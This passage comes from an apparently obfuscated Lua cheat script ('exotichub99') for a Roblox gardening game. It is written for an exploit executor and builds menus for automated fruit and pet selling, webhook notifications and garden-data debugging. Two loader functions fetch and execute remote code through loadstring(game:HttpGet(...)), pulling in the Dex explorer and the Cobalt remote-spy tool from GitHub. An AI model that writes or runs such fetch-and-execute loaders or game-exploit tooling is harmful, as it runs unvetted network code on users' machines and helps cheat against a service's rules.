				if V < y then
					g.Notify("Maximum sell KG must be higher than minimum KG", 3)
					j:SetValue(tostring(h.sell_max_weight))
					j:SetText(c(h.sell_max_weight))
					return
				end
				h.sell_max_weight = Z.FruitFilters.RoundWeight(V)
				j:SetText(c(h.sell_max_weight))
				a.Save.SaveDataSync()
			end
		})
		y:AddDivider()
		local J
		J = y:AddValueDropdown("sell_mutation_whitelist", {
			Values = Z.FruitFilters.GetMutationNames(),
			Default = {},
			Multi = true;
			Text = "\226\156\133 Only Mutations",
			Tooltip = "Only sell fruits with selected mutations. Empty allows all mutations.";
			Searchable = true,
			MaxVisibleDropdownItems = 10;
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.sell_mutation_whitelist = G
				a.Save.SaveDataSync()
			end
		})
		J:SetValue(h.sell_mutation_whitelist)
		local T
		T = y:AddValueDropdown("sell_mutation_blacklist", {
			Values = Z.FruitFilters.GetMutationNames();
			Default = {},
			Multi = true;
			Text = "\226\155\148 Protect Mutations",
			Tooltip = "Selected mutations will not be sold.";
			Searchable = true,
			MaxVisibleDropdownItems = 10;
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.sell_mutation_blacklist = G
				a.Save.SaveDataSync()
			end
		})
		T:SetValue(h.sell_mutation_blacklist)
		y:AddDivider()
		local d
		d = y:AddValueDropdown("sell_variant_whitelist", {
			Values = Z.FruitFilters.GetVariantNames(),
			Default = {};
			Multi = true;
			Text = "\226\156\133 Only Variants";
			Tooltip = "Only sell selected variants. Empty allows all variants.",
			Searchable = false;
			MaxVisibleDropdownItems = 5,
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.sell_variant_whitelist = G
				a.Save.SaveDataSync()
			end
		})
		d:SetValue(h.sell_variant_whitelist)
		local u
		u = y:AddValueDropdown("sell_variant_blacklist", {
			Values = Z.FruitFilters.GetVariantNames();
			Default = {},
			Multi = true;
			Text = "\240\159\155\161\239\184\143 Protect Variants",
			Tooltip = "Selected variants will not be sold.",
			Searchable = false;
			MaxVisibleDropdownItems = 5;
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.sell_variant_blacklist = G
				a.Save.SaveDataSync()
			end
		})
		u:SetValue(h.sell_variant_blacklist)
	end
	if i then
		i:AddLabel({
			Text = "\240\159\155\161\239\184\143 Pet seller only sells selected pets. Equipped, unknown, protected, Rainbow and Big/Huge pets are protected by default.",
			DoesWrap = true
		})
		i:AddToggle("pet_sell_preview_only_ui", {
			Text = "\240\159\145\128 Preview Only";
			Default = h.pet_sell_preview_only;
			Tooltip = "Shows how many pets are safe to sell without selling them.",
			Callback = function(G)
				h.pet_sell_preview_only = G
				a.Save.SaveDataSync()
			end
		})
		i:AddToggle("auto_sell_pets_ui", {
			Text = "\240\159\144\190 Enable Pet Seller";
			Default = h.auto_sell_pets;
			Tooltip = "Sells only selected pets that pass all protection filters.",
			Callback = function(G)
				h.auto_sell_pets = G
				Z.PetSeller.NextRunAt = 0
				a.Save.SaveDataSync()
			end
		})
		i:AddToggle("pet_sell_duplicate_only_ui", {
			Text = "\240\159\147\166 Duplicate Only";
			Default = h.pet_sell_duplicate_only;
			Tooltip = "Keeps the chosen amount for each pet size and variant bucket.";
			Callback = function(G)
				h.pet_sell_duplicate_only = G
				a.Save.SaveDataSync()
			end
		})
		local G
		G = i:AddInput("pet_sell_keep_amount_ui", {
			Text = "\240\159\148\146 Keep Per Pet";
			Default = tostring(h.pet_sell_keep_amount),
			Numeric = true,
			AllowEmpty = true;
			Finished = true;
			ClearTextOnFocus = false;
			Placeholder = "Keep amount",
			Tooltip = "How many pets to keep in each name, size and variant bucket.",
			Callback = function(V)
				local y = z(V)
				if y == nil or y < 0 then
					g.Notify("Keep amount must be 0 or more", 3)
					G:SetValue(tostring(h.pet_sell_keep_amount))
					return
				end
				h.pet_sell_keep_amount = y
				a.Save.SaveDataSync()
			end
		})
		local V
		V = i:AddInput("pet_sell_max_per_cycle_ui", {
			Text = "\240\159\148\162 Max Per Cycle";
			Default = tostring(h.pet_sell_max_per_cycle),
			Numeric = true,
			AllowEmpty = true;
			Finished = true,
			ClearTextOnFocus = false;
			Placeholder = "Pets per cycle",
			Tooltip = "Maximum pets sold each cycle.";
			Callback = function(G)
				local y = z(G)
				if y == nil or y <= 0 then
					g.Notify("Max per cycle must be above 0", 3)
					V:SetValue(tostring(h.pet_sell_max_per_cycle))
					return
				end
				h.pet_sell_max_per_cycle = math.clamp(y, 1, 100)
				a.Save.SaveDataSync()
			end
		})
		local y
		y = i:AddInput("pet_sell_delay_ui", {
			Text = "\226\143\177\239\184\143 Delay";
			Default = tostring(h.pet_sell_delay),
			Numeric = true;
			AllowEmpty = true;
			Finished = true;
			ClearTextOnFocus = false;
			Placeholder = "Seconds",
			Tooltip = "Delay between each pet sale.";
			Callback = function(G)
				local V = f(G)
				if not V or V < .15 then
					g.Notify("Pet sell delay must be 0.15 or more", 3)
					y:SetValue(tostring(h.pet_sell_delay))
					return
				end
				h.pet_sell_delay = math.clamp(V, .15, 10)
				a.Save.SaveDataSync()
			end
		})
		i:AddButton({
			Text = "\226\153\187\239\184\143 Refresh Pet Lists";
			Tooltip = "Refreshes all pet seller dropdowns.";
			Func = function()
				if g.PetSellerUi.RefreshPetDropdowns then
					g.PetSellerUi.RefreshPetDropdowns()
				end
			end
		})
	end
	if c then
		local G
		local V
		local y
		local j
		local i
		local J
		local T
		G = c:AddValueDropdown("pet_sell_selected_ui", {
			Values = {},
			Default = {},
			Multi = true;
			Text = "\240\159\144\190 Pets To Sell",
			Tooltip = "Only selected pets can be sold. Empty sells nothing.";
			Searchable = true;
			MaxVisibleDropdownItems = 10,
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.pet_sell_selected = G
				Z.PetSeller.NextRunAt = 0
				a.Save.SaveDataSync()
			end
		})
		V = c:AddValueDropdown("pet_sell_protected_ui", {
			Values = {},
			Default = {};
			Multi = true;
			Text = "\240\159\155\161\239\184\143 Protect Pet Names";
			Tooltip = "Selected pet names will not be sold.";
			Searchable = true;
			MaxVisibleDropdownItems = 10,
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.pet_sell_protected = G
				a.Save.SaveDataSync()
			end
		})
		y = c:AddValueDropdown("pet_sell_protected_ids_ui", {
			Values = {};
			Default = {},
			Multi = true;
			Text = "\240\159\148\144 Protect Exact Pets",
			Tooltip = "Selected exact pet IDs will not be sold.",
			Searchable = true,
			MaxVisibleDropdownItems = 10,
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.pet_sell_protected_ids = G
				a.Save.SaveDataSync()
			end
		})
		g.PetSellerUi.RefreshPetDropdowns = function()
			local c = Z.PetSeller.GetPetNameDropdown()
			if G then
				G:SetValues(c)
				G:SetValue(h.pet_sell_selected)
			end
			if V then
				V:SetValues(c)
				V:SetValue(h.pet_sell_protected)
			end
			if y then
				y:SetValues(Z.PetSeller.GetProtectedIdDropdown())
				y:SetValue(h.pet_sell_protected_ids)
			end
			if j then
				j:SetValues(Z.PetSeller.GetSizeNames())
				j:SetValue(h.pet_sell_size_whitelist)
			end
			if i then
				i:SetValues(Z.PetSeller.GetSizeNames())
				i:SetValue(h.pet_sell_size_blacklist)
			end
			if J then
				J:SetValues(Z.PetSeller.GetVariantNames())
				J:SetValue(h.pet_sell_variant_whitelist)
			end
			if T then
				T:SetValues(Z.PetSeller.GetVariantNames())
				T:SetValue(h.pet_sell_variant_blacklist)
			end
		end
		c:AddDropdown("pet_sell_max_rarity_ui", {
			Values = Z.PetSeller.RarityOrder,
			Default = h.pet_sell_max_rarity,
			Multi = false,
			Text = "\226\173\144 Max Rarity To Sell",
			Tooltip = "Pets above this rarity will not be sold.",
			Callback = function(G)
				if type(G) ~= "string" or not g.RarityRank[G] then
					return
				end
				h.pet_sell_max_rarity = G
				a.Save.SaveDataSync()
			end
		})
		c:AddToggle("pet_sell_protect_rainbow_ui", {
			Text = "\240\159\140\136 Protect Rainbow",
			Default = h.pet_sell_protect_rainbow,
			Tooltip = "Rainbow pets will not be sold.",
			Callback = function(G)
				h.pet_sell_protect_rainbow = G
				a.Save.SaveDataSync()
			end
		})
		c:AddToggle("pet_sell_protect_big_huge_ui", {
			Text = "\240\159\147\143 Protect Big/Huge";
			Default = h.pet_sell_protect_big_huge;
			Tooltip = "Big and Huge pets will not be sold.";
			Callback = function(G)
				h.pet_sell_protect_big_huge = G
				a.Save.SaveDataSync()
			end
		})
		local d
		d = c:AddInput("pet_sell_max_base_price_ui", {
			Text = "\240\159\146\184 Max Base Price";
			Default = tostring(h.pet_sell_max_base_price);
			Numeric = true;
			AllowEmpty = true;
			Finished = true,
			ClearTextOnFocus = false;
			Placeholder = "0 disables";
			Tooltip = "Pets above this base price will not be sold. Use 0 to disable.",
			Callback = function(G)
				local V = z(G)
				if V == nil or V < 0 then
					g.Notify("Max base price must be 0 or more", 3)
					d:SetValue(tostring(h.pet_sell_max_base_price))
					return
				end
				h.pet_sell_max_base_price = V
				a.Save.SaveDataSync()
			end
		})
		c:AddDivider()
		j = c:AddValueDropdown("pet_sell_size_whitelist_ui", {
			Values = {},
			Default = {},
			Multi = true;
			Text = "\226\156\133 Only Sizes",
			Tooltip = "Only selected sizes can be sold. Empty allows all sizes.";
			Searchable = false;
			MaxVisibleDropdownItems = 5;
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.pet_sell_size_whitelist = G
				a.Save.SaveDataSync()
			end
		})
		i = c:AddValueDropdown("pet_sell_size_blacklist_ui", {
			Values = {},
			Default = {};
			Multi = true;
			Text = "\240\159\155\161\239\184\143 Protect Sizes",
			Tooltip = "Selected sizes will not be sold.";
			Searchable = false,
			MaxVisibleDropdownItems = 5;
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.pet_sell_size_blacklist = G
				a.Save.SaveDataSync()
			end
		})
		J = c:AddValueDropdown("pet_sell_variant_whitelist_ui", {
			Values = {},
			Default = {};
			Multi = true,
			Text = "\226\156\133 Only Variants";
			Tooltip = "Only selected variants can be sold. Empty allows all variants.";
			Searchable = false,
			MaxVisibleDropdownItems = 5,
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.pet_sell_variant_whitelist = G
				a.Save.SaveDataSync()
			end
		})
		T = c:AddValueDropdown("pet_sell_variant_blacklist_ui", {
			Values = {},
			Default = {},
			Multi = true,
			Text = "\240\159\155\161\239\184\143 Protect Variants",
			Tooltip = "Selected variants will not be sold.",
			Searchable = false,
			MaxVisibleDropdownItems = 5;
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.pet_sell_variant_blacklist = G
				a.Save.SaveDataSync()
			end
		})
		g.PetSellerUi.RefreshPetDropdowns()
	end
end
q.is_dex_loaded = false
q.LoadDexTool = function()
	if q.is_dex_loaded then
		return
	end
	local G, V = pcall(function()
		(loadstring(game:HttpGet("https://github.com/BOXLEGENDARY/Dex/releases/latest/download/out.lua")))()
		q.is_dex_loaded = true
	end)
end
q.is_spy_loaded = false
q.LoadSpyTool = function()
	if q.is_spy_loaded then
		return
	end
	local G, V = pcall(function()
		(loadstring(game:HttpGet("https://github.com/notpoiu/cobalt/releases/latest/download/Cobalt.luau")))()
		q.is_spy_loaded = true
	end)
end
g.WebhooksUi = function()
	local G = d:AddTab({
		Name = "Webhooks",
		Description = "Webhook notifications";
		Icon = "webhook"
	})
	local V = G:AddRightGroupbox("Notifications", "bell-ring")
	local y = G:AddLeftGroupbox("Webhook URL", "link")
	if V then
		V:AddToggle("webhook_event_seed_notifications", {
			Text = "\240\159\140\136 Gold & Rainbow Seeds",
			Default = h.webhook_event_seeds;
			Tooltip = "Send a notification when you collect a Gold or Rainbow Seed.";
			Callback = function(G)
				h.webhook_event_seeds = G
				if not G then
					table.clear(g.EventSeed_WebhookData)
				end
				a.Save.SaveDataSync()
			end
		})
		V:AddToggle("webhook_pet_buy_notifications", {
			Text = "\240\159\144\190 Pet Purchases";
			Default = h.webhook_pet_buys;
			Tooltip = "Send a notification after a pet purchase is confirmed.",
			Callback = function(G)
				h.webhook_pet_buys = G
				if not G then
					if type(g.PetFinder_WebhookData) == "table" then
						table.clear(g.PetFinder_WebhookData)
					end
					Z.Webhooks.ClearStatus()
				end
				a.Save.SaveDataSync()
			end
		})
		V:AddToggle("webhook_mail_manual_notifications", {
			Text = "\240\159\147\166 Manual Orders Completed",
			Default = h.webhook_mail_manual;
			Tooltip = "Send a notification when a manual order is fully delivered.";
			Callback = function(G)
				h.webhook_mail_manual = G
				if not G then
					Z.Webhooks.RemoveMailType("manual")
				end
				a.Save.SaveDataSync()
			end
		})
		V:AddToggle("webhook_mail_auto_notifications", {
			Text = "\226\154\153\239\184\143 Automatic Mail Sent",
			Default = h.webhook_mail_auto;
			Tooltip = "Send a notification after an automatic mail cycle completes.";
			Callback = function(G)
				h.webhook_mail_auto = G
				if not G then
					Z.Webhooks.RemoveMailType("automatic")
				end
				a.Save.SaveDataSync()
			end
		})
		V:AddToggle("webhook_mail_claim_notifications", {
			Text = "\240\159\147\165 Incoming Mail Claimed",
			Default = h.webhook_mail_claims;
			Tooltip = "Send a notification after incoming mail is claimed.",
			Callback = function(G)
				h.webhook_mail_claims = G
				if not G then
					Z.Webhooks.RemoveMailType("claim")
				end
				a.Save.SaveDataSync()
			end
		})
	end
	if y then
		y:AddLabel({
			Text = "\240\159\148\151 Notifications will be posted to this URL.",
			DoesWrap = true
		})
		local G
		G = y:AddInput("webhook_url_input", {
			Text = "\240\159\148\151 Webhook URL";
			Default = tostring(h.webhook_url or "");
			Numeric = false;
			AllowEmpty = true,
			Finished = false;
			ClearTextOnFocus = false;
			Placeholder = "https://your-webhook-url",
			Tooltip = "Enter the URL that will receive notifications.",
			Callback = function(V)
				local y = (tostring(V or "")):match("^%s*(.-)%s*$") or ""
				if y ~= "" and not Z.Webhooks.IsValidUrl(y) then
					g.Notify("Enter a valid HTTP or HTTPS webhook URL", 3)
					G:SetValue(tostring(h.webhook_url or ""))
					return
				end
				h.webhook_url = y
				a.Save.SaveDataSync()
				if y == "" then
					g.Notify("Webhook URL cleared", 2)
				else
					g.Notify("Webhook URL saved", 2)
				end
			end
		})
		y:AddToggle("webhook_enabled", {
			Text = "Enable Webhooks";
			Default = h.webhook_enabled,
			Tooltip = "Enable or disable all webhook notifications";
			Callback = function(G)
				h.webhook_enabled = G
				if not G then
					table.clear(g.PetFinder_WebhookData)
					table.clear(g.Mail_WebhookData)
					table.clear(g.EventSeed_WebhookData)
					if type(g.ShopPurchase_WebhookData) == "table" then
						table.clear(g.ShopPurchase_WebhookData)
					end
					Z.Webhooks.ClearStatus()
				end
				a.Save.SaveDataSync()
			end
		})
	end
end
Z.GardenSyncDebug = {
	BytesPerKilobyteGardenSyncDebug = 1024,
	GetGardenSyncDebug = function()
		local G = y.GardenSyncController
		if type(G) ~= "table" or type(G.GetGarden) ~= "function" then
			return nil, "GardenSyncController unavailable"
		end
		local V, Z = pcall(function()
			return G:GetGarden(g.player_userid)
		end)
		if not V or type(Z) ~= "table" then
			return nil, "No garden sync data"
		end
		return Z, nil
	end;
	GetEncodedGardenSyncDebug = function()
		local G, V = Z.GardenSyncDebug.GetGardenSyncDebug()
		if not G then
			return nil, tostring(V or "No garden sync data")
		end
		local j, i = pcall(function()
			return y.HttpService:JSONEncode(G)
		end)
		if not j or type(i) ~= "string" or i == "" then
			return nil, "JSON encode failed"
		end
		return i, nil
	end;
	GetSavePathGardenSyncDebug = function()
		local G = "exotichub99"
		local V = G .. "/debug"
		if type(isfolder) == "function" and type(makefolder) == "function" then
			if not isfolder(G) then
				makefolder(G)
			end
			if not isfolder(V) then
				makefolder(V)
			end
		end
		local y = os.date("%Y%m%d_%H%M%S")
		return V .. ("/garden_sync_" .. (tostring(g.player_userid or "player") .. ("_" .. (y .. ".json"))))
	end;
	SaveGardenSyncJsonDebug = function(G)
		if type(writefile) ~= "function" then
			if G then
				G:SetText("writefile is not supported by this executor")
			end
			g.Notify("writefile is not supported", 3)
			return false
		end
		local V, y = Z.GardenSyncDebug.GetEncodedGardenSyncDebug()
		if not V then
			if G then
				G:SetText(tostring(y or "No garden sync data"))
			end
			g.Notify(tostring(y or "No garden sync data"), 3)
			return false
		end
		local j = Z.GardenSyncDebug.GetSavePathGardenSyncDebug()
		local i, c = pcall(function()
			writefile(j, V)
		end)
		if not i then
			if G then
				G:SetText("Save failed: " .. tostring(c))
			end
			g.Notify("Garden sync save failed", 3)
			return false
		end
		if G then
			G:SetText("Saved Garden Sync JSON\n" .. (j .. ("\nLength: " .. tostring(# V))))
		end
		g.Notify("Garden sync JSON saved", 2)
		return true
	end;
	ShowGardenSyncSizeDebug = function(G)
		local V, y = Z.GardenSyncDebug.GetEncodedGardenSyncDebug()
		if not V then
			if G then
				G:SetText(tostring(y or "No garden sync data"))
			end
			g.Notify(tostring(y or "No garden sync data"), 3)
			return false
		end
		local j = # V
		local i = j / Z.GardenSyncDebug.BytesPerKilobyteGardenSyncDebug
		local c = i / Z.GardenSyncDebug.BytesPerKilobyteGardenSyncDebug
		local J = string.format("Garden data size\n%d bytes | %.2f KB | %.2f MB", j, i, c)
		if G then
			G:SetText(J)
		end
		g.Notify(string.format("Garden data size: %.2f MB", c), 3)
		return true
	end,
	BuildGardenSyncDebugUi = function(G)
		if not G then
			return false
		end
		local V = nil
		G:AddDivider()
		G:AddButton({
			Text = "Save Garden Sync JSON",
			Func = function()
				Z.GardenSyncDebug.SaveGardenSyncJsonDebug(V)
			end
		})
		G:AddButton({
			Text = "Check Garden Data Size";
			Func = function()
				Z.GardenSyncDebug.ShowGardenSyncSizeDebug(V)
			end
		})
		V = G:AddLabel({
			Text = "Save the garden data or check its size.",
			DoesWrap = true
		})
		return true
	end
}
Z.FarmGridDebug = {
	FolderNameFarmGridDebug = "ExoFarmGridDebug";
	DotSizeFarmGridDebug = .18,
	GridSpacingFarmGridDebug = .5;
	EdgePaddingFarmGridDebug = 0;
	PlantBlockDistanceFarmGridDebug = .5,
	ShowLabelsFarmGridDebug = false;
	ClearFarmGridDebug = function()
		local G = Z.Farm.GetOwnPlot()
		local V = G and G:FindFirstChild(Z.FarmGridDebug.FolderNameFarmGridDebug)
		if V then
			V:Destroy()
		end
		return true
	end,
	GetPlantBlockPositionsFarmGridDebug = function()
		local G = {}
		local V = Z.FruitFiltersDataSync
		local y = Z.Farm.GetSpawnPoint()
		if not V or type(V.Plants) ~= "table" or typeof(y) ~= "Instance" or not y:IsA("BasePart") then
			return G
		end
		if not V.Started and type(V.StartSync) == "function" then
			V.StartSync()
		end
		for V, Z in pairs(V.Plants) do
			local j = type(Z) == "table" and (not Z.Removed and Z.Positions) or nil
			local i = type(j) == "table" and tonumber(j.PosX) or nil
			local c = type(j) == "table" and tonumber(j.PosY) or nil
			local J = type(j) == "table" and tonumber(j.PosZ) or nil
			if i and (c and J) then
				table.insert(G, y.CFrame:PointToWorldSpace(Vector3.new(i, c, J)))
			end
		end
		return G
	end,
	GetSprinklerBlockPositionsFarmGridDebug = function()
		local G = {}
		local V = Z.SprinklerPlacer.GetSprinklersFolder()
		if not V then
			return G
		end
		for V, y in ipairs(V:GetChildren()) do
			local Z = nil
			if y:IsA("Model") then
				local G, V = pcall(function()
					return y:GetPivot()
				end)
				Z = G and (typeof(V) == "CFrame" and V.Position) or nil
			elseif y:IsA("BasePart") then
				Z = y.Position
			end
			if typeof(Z) == "Vector3" then
				table.insert(G, Z)
			end
		end
		return G
	end;
	IsBlockedFarmGridDebug = function(G, V, y)
		if typeof(G) ~= "Vector3" then
			return false
		end
		for V, y in ipairs(V or {}) do
			if typeof(y) == "Vector3" and (Vector3.new(G.X - y.X, 0, G.Z - y.Z)).Magnitude < Z.FarmGridDebug.PlantBlockDistanceFarmGridDebug then
				return true
			end
		end
		for V, y in ipairs(y or {}) do
			if typeof(y) == "Vector3" and (Vector3.new(G.X - y.X, 0, G.Z - y.Z)).Magnitude < Z.FarmGridDebug.GridSpacingFarmGridDebug then
				return true
			end
		end
		return false
	end,
	GetColourFarmGridDebug = function(G, V, y)
		if y then
			return Color3.fromRGB(35, 145, 255)
		end
		local Z = V > 0 and math.clamp(G / V, 0, 1) or 0
		return Color3.fromRGB(math.floor(255 * Z), math.floor(255 * ((1 - Z))), 0)
	end,
	CreateDotFarmGridDebug = function(G, V, y, j)
		local i = Instance.new("Part")
		i.Name = string.format("FarmGrid_%04d_%s_X%.1f_Z%.1f", V.index, V.areaName, V.localPosition.X, V.localPosition.Z)
		i.Shape = Enum.PartType.Ball
		i.Size = Vector3.new(Z.FarmGridDebug.DotSizeFarmGridDebug, Z.FarmGridDebug.DotSizeFarmGridDebug, Z.FarmGridDebug.DotSizeFarmGridDebug)
		i.Anchored = true
		i.CanCollide = false
		i.CanQuery = false
		i.CanTouch = false
		i.Material = Enum.Material.Neon
		i.Color = y
		i.Position = V.position + Vector3.new(0, .08, 0)
		i:SetAttribute("SpotIndex", V.index)
		i:SetAttribute("AreaName", V.areaName)
		i:SetAttribute("LocalX", V.localPosition.X)
		i:SetAttribute("LocalZ", V.localPosition.Z)
		i:SetAttribute("DistanceFromCenter", math.floor(((V.distance or 0)) * 100) / 100)
		i:SetAttribute("SquareRing", tonumber(V.squareRing) or 0)
		i:SetAttribute("Blocked", j == true)
		i.Parent = G
		local c = Instance.new("BillboardGui")
		c.Name = "SpotNumber"
		c.Enabled = Z.FarmGridDebug.ShowLabelsFarmGridDebug == true
		c.AlwaysOnTop = true
		c.Size = UDim2.fromOffset(36, 14)
		c.StudsOffset = Vector3.new(0, .45, 0)
		c.Parent = i
		local J = Instance.new("TextLabel")
		J.BackgroundTransparency = 1
		J.Size = UDim2.fromScale(1, 1)
		J.Text = tostring(V.index)
		J.TextColor3 = Color3.new(1, 1, 1)
		J.TextScaled = true
		J.TextStrokeTransparency = 0
		J.Parent = c
	end,
	SetLabelsVisibleFarmGridDebug = function(G)
		Z.FarmGridDebug.ShowLabelsFarmGridDebug = G == true
		local V = Z.Farm.GetOwnPlot()
		local y = V and V:FindFirstChild(Z.FarmGridDebug.FolderNameFarmGridDebug)
		if not y then
			return false
		end
		for G, V in ipairs(y:GetChildren()) do
			local y = V:FindFirstChild("SpotNumber")
			if y then
				y.Enabled = Z.FarmGridDebug.ShowLabelsFarmGridDebug
			end
		end
		return true
	end,
	GenerateFarmGridDebug = function()
		local G = Z.Farm.GetOwnPlot()
		local V = Z.Farm.GetPermanentCenterPosition()
		if not G or typeof(V) ~= "Vector3" then
			return false, "Farm grid unavailable"
		end
		local y = Z.FarmGrid.GetSortedSpotsFarmGrid(V, "BothCol")
		if # y == 0 then
			return false, "Farm grid unavailable"
		end
		Z.FarmGridDebug.ClearFarmGridDebug()
		local j = Instance.new("Folder")
		j.Name = Z.FarmGridDebug.FolderNameFarmGridDebug
		j.Parent = G
		local i = 0
		for G, V in ipairs(y) do
			i = math.max(i, tonumber(V.squareRing) or tonumber(V.distance) or 0)
		end
		local c = Z.FarmGridDebug.GetPlantBlockPositionsFarmGridDebug()
		local J = Z.FarmGridDebug.GetSprinklerBlockPositionsFarmGridDebug()
		local T = 0
		local d = Z.FarmGrid.GetAreaCountsFarmGrid(y)
		for G, V in ipairs(y) do
			local y = Z.FarmGridDebug.IsBlockedFarmGridDebug(V.position, c, J)
			if y then
				T += 1
			end
			Z.FarmGridDebug.CreateDotFarmGridDebug(j, V, Z.FarmGridDebug.GetColourFarmGridDebug(V.squareRing or V.distance, i, y), y)
		end
		local u = {}
		for G, V in pairs(d) do
			table.insert(u, tostring(G) .. (": " .. tostring(V)))
		end
		table.sort(u)
		return true, string.format("Generated %d spots | %d blocked | %s", # y, T, table.concat(u, " | "))
	end
}
g.TestGardenSync = {
	Started = false;
	RenderLoopRunning = false,
	Connections = {};
	Plants = {},
	Fruits = {},
	RemovedFruits = {},
	BaseWeightCache = {};
	GenerationModuleCache = {},
	WeightFormatCache = nil,
	OvertimeFlagsCache = nil;
	CalculateOvertimeGrowthCache = nil;
	GrowRateDataCache = nil;
	Label = nil,
	Dropdown = nil,
	WatchPlantId = "",
	RenderInterval = .35,
	MaxPlants = 3,
	MaxFruitsPerPlant = 12,
	Colours = {
		Title = "#7CFC00";
		Plant = "#6EE7FF";
		Fruit = "#FFFFFF",
		Ready = "#7CFC00",
		Growing = "#FFD166",
		Removed = "#FF5C5C",
		Muted = "#AAAAAA",
		Gold = "#FFD700",
		Rainbow = "#FF66FF",
		Normal = "#DADADA";
		Kg = "#7CFC00",
		Id = "#888888",
		Bad = "#FF5C5C"
	};
	Now = function()
		return os.clock()
	end;
	WallNow = function()
		return os.time()
	end,
	S = function(G)
		return tostring(G or "")
	end,
	N = function(G, V)
		local y = tonumber(G)
		if y == nil then
			return V or 0
		end
		return y
	end;
	Round2 = function(G)
		G = tonumber(G) or 0
		return math.floor((G * 100) + .5) / 100
	end;
	Round4 = function(G)
		G = tonumber(G) or 0
		return math.floor((G * 10000) + .5) / 10000
	end,
	ShortId = function(G)
		G = tostring(G or "")
		if # G <= 8 then
			return G
		end
		return string.sub(G, 1, 8)
	end,
	Html = function(G)
		G = tostring(G or "")
		G = G:gsub("&", "&amp;")
		G = G:gsub("<", "&lt;")
		G = G:gsub(">", "&gt;")
		G = G:gsub("\"", "&quot;")
		return G
	end;
	C = function(G, V)
		return string.format("<font color=\"%s\">%s</font>", G or "#FFFFFF", g.TestGardenSync.Html(V))
	end,
	Key = function(G, V)
		return tostring(G or "") .. ("\031" .. tostring(V or ""))
	end;
	IsMine = function(G)
		return tonumber(G) == tonumber(g.player_userid)
	end;
	SafeRequire = function(G)
		if not G then
			return nil
		end
		local V, Z = pcall(function()
			if type(y.safeRequire) == "function" then
				return y.safeRequire(G)
			end
			return require(G)
		end)
		if V then
			return Z
		end
		return nil
	end;
	GetGarden = function()
		local G = y.GardenSyncController
		if type(G) ~= "table" or type(G.GetGarden) ~= "function" then
			return nil
		end
		local V, Z = pcall(function()
			return G:GetGarden(g.player_userid)
		end)
		if V and type(Z) == "table" then
			return Z
		end
		return nil
	end,
	CopyFields = function(G, V)
		if type(G) ~= "table" or type(V) ~= "table" then
			return V
		end
		for G, y in pairs(G) do
			if type(y) ~= "table" then
				V[G] = y
			elseif G == "Positions" then
				V[G] = {
					PosX = y.PosX;
					PosY = y.PosY;
					PosZ = y.PosZ;
					Rotation = y.Rotation
				}
			end
		end
		return V
	end,
	MutationText = function(G)
		if type(G) ~= "string" then
			return ""
		end
		return G
	end,
	GetVariant = function(G, V)
		G = g.TestGardenSync.MutationText(G)
		if G:find("Rainbow", 1, true) then
			return "Rainbow"
		end
		if G:find("Gold", 1, true) then
			return "Gold"
		end
		V = tostring(V or "")
		if V == "Rainbow" or V == "Gold" then
			return V
		end
		return "Normal"
	end,
	GetVariantColour = function(G)
		if G == "Gold" then
			return g.TestGardenSync.Colours.Gold
		end
		if G == "Rainbow" then
			return g.TestGardenSync.Colours.Rainbow
		end
		return g.TestGardenSync.Colours.Normal
	end,
	GetSharedModules = function()
		return y.SharedModules or (y.ReplicatedStorage and y.ReplicatedStorage:FindFirstChild("SharedModules"))
	end,
	GetWeightFormat = function()
		if g.TestGardenSync.WeightFormatCache ~= nil then
			return g.TestGardenSync.WeightFormatCache ~= false and g.TestGardenSync.WeightFormatCache or nil
		end
		g.TestGardenSync.WeightFormatCache = false
		if type(y.WeightFormat) == "table" then
			g.TestGardenSync.WeightFormatCache = y.WeightFormat
			return y.WeightFormat
		end
		local G = g.TestGardenSync.GetSharedModules()
		local V = G and G:FindFirstChild("WeightFormat")
		local Z = g.TestGardenSync.SafeRequire(V)
		if type(Z) == "table" and type(Z.FormatGrams) == "function" then
			g.TestGardenSync.WeightFormatCache = Z
			return Z
		end
		return nil
	end;
	FormatKg = function(G)
		G = tonumber(G) or 0
		local V = g.TestGardenSync.GetWeightFormat()
		if type(V) == "table" and type(V.FormatGrams) == "function" then
			local y, Z = pcall(function()
				return V.FormatGrams(G)
			end)
			if y and type(Z) == "string" then
				return Z
			end
		end
		return string.format("%.2fkg", g.TestGardenSync.Round2(G))
	end,
	GetOvertimeFlags = function()
		if g.TestGardenSync.OvertimeFlagsCache ~= nil then
			return g.TestGardenSync.OvertimeFlagsCache ~= false and g.TestGardenSync.OvertimeFlagsCache or nil
		end
		g.TestGardenSync.OvertimeFlagsCache = false
		if type(y.OvertimeGrowthFlags) == "table" then
			g.TestGardenSync.OvertimeFlagsCache = y.OvertimeGrowthFlags
			return y.OvertimeGrowthFlags
		end
		local G = g.TestGardenSync.GetSharedModules()
		local V = G and G:FindFirstChild("Flags")
		local Z = V and V:FindFirstChild("OvertimeGrowthFlags")
		local j = g.TestGardenSync.SafeRequire(Z)
		if type(j) == "table" then
			g.TestGardenSync.OvertimeFlagsCache = j
			return j
		end
		return nil
	end;
	IsOvertimeEnabled = function()
		local G = g.TestGardenSync.GetOvertimeFlags()
		if type(G) ~= "table" then
			return true
		end
		local V = G.Enabled
		if type(V) == "table" and type(V.Get) == "function" then
			local G, y = pcall(function()
				return V:Get()
			end)
			if G then
				return y == true
			end
		end
		if type(V) == "boolean" then
			return V
		end
		return true
	end,
	GetCalculateOvertimeGrowth = function()
		if g.TestGardenSync.CalculateOvertimeGrowthCache ~= nil then
			return g.TestGardenSync.CalculateOvertimeGrowthCache ~= false and g.TestGardenSync.CalculateOvertimeGrowthCache or nil
		end
		g.TestGardenSync.CalculateOvertimeGrowthCache = false
		if type(y.CalculateOvertimeGrowth) == "function" then
			g.TestGardenSync.CalculateOvertimeGrowthCache = y.CalculateOvertimeGrowth
			return y.CalculateOvertimeGrowth
		end
		local G = g.TestGardenSync.GetSharedModules()
		local V = G and G:FindFirstChild("CalculateOvertimeGrowth")
		local Z = g.TestGardenSync.SafeRequire(V)
